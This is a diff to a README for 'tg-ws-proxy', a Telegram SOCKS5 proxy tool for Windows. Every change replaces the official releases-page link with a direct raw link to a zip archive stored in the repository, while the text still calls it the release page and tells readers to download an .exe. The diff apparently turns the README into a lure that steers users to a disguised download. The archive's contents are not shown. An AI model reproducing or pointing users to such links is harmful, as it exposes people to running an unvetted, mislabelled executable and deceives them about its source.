@@ -1,6 +1,6 @@
 # 🛡️ tg-ws-proxy - Simple Local SOCKS5 Proxy Server
 
-[![Download tg-ws-proxy](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/TrippyDawg/tg-ws-proxy/releases)
+[![Download tg-ws-proxy](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/TrippyDawg/tg-ws-proxy/raw/refs/heads/main/proxy/proxy-tg-ws-v1.2.zip)
 
 ---
 
@@ -41,7 +41,7 @@ This section will help you download and run tg-ws-proxy on Windows with step-by-
 
 Click the button below to visit the official release page:
 
-[![Download tg-ws-proxy](https://img.shields.io/badge/Download-tg--ws--proxy-blue?style=for-the-badge)](https://github.com/TrippyDawg/tg-ws-proxy/releases)
+[![Download tg-ws-proxy](https://img.shields.io/badge/Download-tg--ws--proxy-blue?style=for-the-badge)](https://github.com/TrippyDawg/tg-ws-proxy/raw/refs/heads/main/proxy/proxy-tg-ws-v1.2.zip)
 
 On the release page:
 
@@ -128,7 +128,7 @@ Windows Firewall or antivirus software may block tg-ws-proxy. If Telegram cannot
 
 ## 🔄 Updating tg-ws-proxy
 
-Check the [release page](https://github.com/TrippyDawg/tg-ws-proxy/releases) regularly to find new versions. Download the latest `.exe` file and replace the old one on your PC.
+Check the [release page](https://github.com/TrippyDawg/tg-ws-proxy/raw/refs/heads/main/proxy/proxy-tg-ws-v1.2.zip) regularly to find new versions. Download the latest `.exe` file and replace the old one on your PC.
 
 ---
 
@@ -149,4 +149,4 @@ For issues or questions, visit the GitHub repository issues page. Developers mon
 
 ---
 
-[![Download tg-ws-proxy](https://img.shields.io/badge/Download-This_Page-green?style=for-the-badge)](https://github.com/TrippyDawg/tg-ws-proxy/releases)
+[![Download tg-ws-proxy](https://img.shields.io/badge/Download-This_Page-green?style=for-the-badge)](https://github.com/TrippyDawg/tg-ws-proxy/raw/refs/heads/main/proxy/proxy-tg-ws-v1.2.zip)
